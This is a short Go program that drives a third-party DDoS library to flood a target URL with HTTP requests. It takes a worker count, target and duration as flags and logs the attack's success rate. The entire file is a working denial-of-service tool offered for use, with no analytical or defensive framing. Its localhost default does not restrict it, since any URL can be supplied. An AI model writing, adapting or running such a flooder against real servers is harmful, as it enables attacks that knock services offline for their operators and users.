package main

import (
  "time"
  "log"
  "flag"
  ddos "github.com/mengyyy/DDoS"
)

func main() {
	workers := flag.Int("w", 100, "worker num")
	targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
	workTime := flag.Int("t", 1, "how many  seconds attack keep")
	flag.Parse()
	
	log.Println("start ~~~")
	log.Printf("worker | %d\n", *workers)
	log.Printf("target | %s", *targetUrl)
	log.Printf("keep   | %d Seconds\n", *workTime)
	
	headers := map[string]string{
	    "Cache-Control": "no-cache",
	    "Pragma": "no-cache",
	}
	
	d, err := ddos.New(*targetUrl, *workers, headers)
	if err != nil {
	    panic(err)
	}
	d.Run()
	time.Sleep(time.Duration(*workTime) * time.Second)
	d.Stop()
	log.Printf("DDoS attack server: %s\n", *targetUrl)
	// Output: DDoS attack server: http://127.0.0.1:80
  successCnt, amount := d.Result()
  rate := float64(successCnt) / float64(amount) * 100
  log.Printf("success %d\tamount %d\trate %.2f%%", successCnt, amount, rate)
}
  
